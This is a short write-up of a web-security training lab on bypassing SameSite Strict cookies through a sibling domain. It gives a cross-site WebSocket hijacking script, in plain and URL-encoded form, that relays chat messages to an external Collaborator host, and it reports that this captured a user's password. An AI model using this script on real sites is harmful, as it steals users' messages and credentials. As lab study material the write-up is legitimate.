 # Lab: SameSite Strict bypass via sibling domain #

 ## Lab Description ##

 ![image](https://github.com/anandurdas11/Web_Securityy/assets/83402050/c11e0223-365c-4491-95b5-ab119975a9d1)

> For this we use collobaroter Give this script in exploit server 
```
<script>
    var ws = new WebSocket('wss://YOUR-LAB-ID.web-security-academy.net/chat');
    ws.onopen = function() {
        ws.send("READY");
    };
    ws.onmessage = function(event) {
        fetch('https://wggfjewtkdg1hztkfr9byljvcmid63us.oastify.com', {method: 'POST', mode: 'no-cors', body: event.data});
    };
</script>
```
![image](https://github.com/anandurdas11/Web_Securityy/assets/83402050/481c6c6d-5465-407b-ac7b-6ec39ee30434)

![image](https://github.com/anandurdas11/Web_Securityy/assets/83402050/d9a8f51b-f211-4906-95d2-a74248172f6f)

> We url encode the earlier script
```
  %3c%73%63%72%69%70%74%3e%0a%20%20%20%20%76%61%72%20%77%73%20%3d%20%6e%65%77%20%57%65%62%53%6f%63%6b%65%74%28%27%77%73%73%3a%2f%2f%30%61%31%39%30%30%63%62%30%34%33%37%31%61%64%37%38%31%61%63%33%65%37%63%30%30%62%63%30%30%61%30%2e%77%65%62%2d%73%65%63%75%72%69%74%79%2d%61%63%61%64%65%6d%79%2e%6e%65%74%2f%63%68%61%74%27%29%3b%0a%20%20%20%20%77%73%2e%6f%6e%6f%70%65%6e%20%3d%20%66%75%6e%63%74%69%6f%6e%28%29%20%7b%0a%20%20%20%20%20%20%20%20%77%73%2e%73%65%6e%64%28%22%52%45%41%44%59%22%29%3b%0a%20%20%20%20%7d%3b%0a%20%20%20%20%77%73%2e%6f%6e%6d%65%73%73%61%67%65%20%3d%20%66%75%6e%63%74%69%6f%6e%28%65%76%65%6e%74%29%20%7b%0a%20%20%20%20%20%20%20%20%66%65%74%63%68%28%27%68%74%74%70%73%3a%2f%2f%77%67%67%66%6a%65%77%74%6b%64%67%31%68%7a%74%6b%66%72%39%62%79%6c%6a%76%63%6d%69%64%36%33%75%73%2e%6f%61%73%74%69%66%79%2e%63%6f%6d%27%2c%20%7b%6d%65%74%68%6f%64%3a%20%27%50%4f%53%54%27%2c%20%6d%6f%64%65%3a%20%27%6e%6f%2d%63%6f%72%73%27%2c%20%62%6f%64%79%3a%20%65%76%65%6e%74%2e%64%61%74%61%7d%29%3b%0a%20%20%20%20%7d%3b%0a%3c%2f%73%63%72%69%70%74%3e
```

> The we change the script and deliver using the exploit server

![image](https://github.com/anandurdas11/Web_Securityy/assets/83402050/09086283-7b65-4ce2-b345-0c7791c152a3)

> We got the password of carlos and we logged in 

![image](https://github.com/anandurdas11/Web_Securityy/assets/83402050/4dff8c68-dda2-47cf-9f89-89809fec7c98)

![image](https://github.com/anandurdas11/Web_Securityy/assets/83402050/a24de4b0-7a92-4cb1-ae78-0c4cce8b7ba2)
